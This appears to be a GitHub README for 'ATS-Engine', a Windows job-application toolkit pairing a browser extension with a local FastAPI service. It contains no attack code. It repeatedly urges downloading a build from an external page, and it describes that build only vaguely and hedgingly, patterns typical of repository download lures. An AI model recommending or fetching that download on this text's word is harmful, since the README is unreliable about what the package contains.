# ATS-Engine v1.0.0 - Job Application Automation 2026

> **ATS-Engine is a Windows-oriented job search toolkit that pairs a Chromium Manifest V3 extension with a locally hosted FastAPI backend. It captures job information, creates role-specific application documents, and maintains application status records.**

[![Platform](https://img.shields.io/badge/Platform-Windows%20%26%20Chromium-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/tomcybrooks2394/ats-engine-windows-toolkit?style=flat-square)](https://github.com/tomcybrooks2394/ats-engine-windows-toolkit)

---

<p align="center">
  <a href="https://tomcybrooks2394.github.io/ats-engine-windows-toolkit/">
    <img src="https://img.shields.io/badge/Download-ATS--Engine%20Latest-brightgreen?style=for-the-badge" alt="Download ATS-Engine">
  </a>
</p>

> **[Download ATS-Engine v1.0.0](https://tomcybrooks2394.github.io/ats-engine-windows-toolkit/)**

---

[Download Latest Build](https://tomcybrooks2394.github.io/ats-engine-windows-toolkit/)

---

## Overview

ATS-Engine brings job application preparation and tracking into one workflow for supported employment websites. It reads listing information from platforms including LinkedIn, Greenhouse, and Workday, then uses those details to assemble materials suited to the selected position.

The system consists of a Chromium extension and a local Python service powered by FastAPI. Resumes, cover letters, and other generated materials can be saved as PDF, DOCX, or Markdown files. Application activity is kept in CSV files so progress and follow-up actions remain easy to review.

---

## What It Provides

- Capture job descriptions from supported job platforms
- Build ATS-compatible resumes from the details of a target role
- Draft cover letters tailored to specific applications
- Maintain CSV records for application activity and conversion status
- Operate through a Chromium Manifest V3 extension
- Host the backend locally with FastAPI on Windows
- Save generated materials in PDF, DOCX, or Markdown
- Check structured AI output through Pydantic models
- Install through a Windows plug-and-play workflow

---

## Getting Started

### Downloaded package

1. Obtain the newest ATS-Engine build from the [latest download page](https://tomcybrooks2394.github.io/ats-engine-windows-toolkit/).
2. Unpack the downloaded files into a folder on Windows.
3. If the package uses a source-based setup, install its included Python dependencies.
4. Open Chromium's extension management page and load the provided browser extension.

### Build from source

```bash
git clone https://github.com/tomcybrooks2394/ats-engine-windows-toolkit.git
cd REPO
```

Use the supplied launch script or Python entry point to bring up the local backend. Once FastAPI is available, activate the extension in Chromium and point it to the local address displayed by the application.

---

## Operating Workflow

ATS-Engine is generally used in the following sequence:

1. Visit a supported listing in Chromium.
2. Run the ATS-Engine extension to collect the job description.
3. Pass the captured information to the local FastAPI service.
4. Produce a resume and cover letter customized for the position.
5. Export the resulting files as PDF, DOCX, or Markdown.
6. Add the application and its current state to the CSV tracker.

For local development, a FastAPI service can commonly be started with:

```bash
python -m uvicorn app:app --reload
```

If the downloaded build uses a different module or application object, substitute its corresponding `module:object` value for `app:app`.

---

## Settings

ATS-Engine is intended for local operation. Backend connectivity and document output behavior should be set using the configuration files or options included in the downloaded package or source tree.

A representative configuration may look like:

```env
API_HOST=127.0.0.1
API_PORT=8000
OUTPUT_FORMAT=pdf
APPLICATION_LOG=applications.csv
```

When provided, follow the variable names defined by the release package. Store generated documents and CSV tracking data in a location where the application has suitable access permissions.

---

## System Requirements

- Windows
- A Chromium-based browser
- Python runtime for source or backend-based installations
- FastAPI backend
- Chromium extension support for Manifest V3
- Pydantic-compatible structured data validation
- Enough local storage for resumes, cover letters, and tracking files
- Access to supported job platforms such as LinkedIn, Greenhouse, or Workday

---

## Frequently Asked Questions

### What browsers can run ATS-Engine?

Use a Chromium browser with support for Manifest V3 extensions.

### Is a backend included?

Yes. ATS-Engine includes a local FastAPI backend designed to communicate with the browser extension.

### How does application tracking work?

The tool writes application entries and conversion states to CSV files.

### What output file types are available?

ATS-Engine documents can be generated as PDF, DOCX, or Markdown files.

### What is the update process?

Visit the [latest build](https://tomcybrooks2394.github.io/ats-engine-windows-toolkit/) to look for a newer release, then follow that release's installation instructions to replace the current files. Back up configuration and tracking data you intend to retain before updating.

### What can I do when job extraction fails?

First check that the listing is hosted on a supported employment platform. Then make sure the Chromium extension is enabled and the local FastAPI backend is running. The extension should also be configured with the correct local backend address.

### Where should problems and questions be posted?

Submit reproducible issues, configuration questions, and feature discussions through the repository's GitHub issue tracker.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
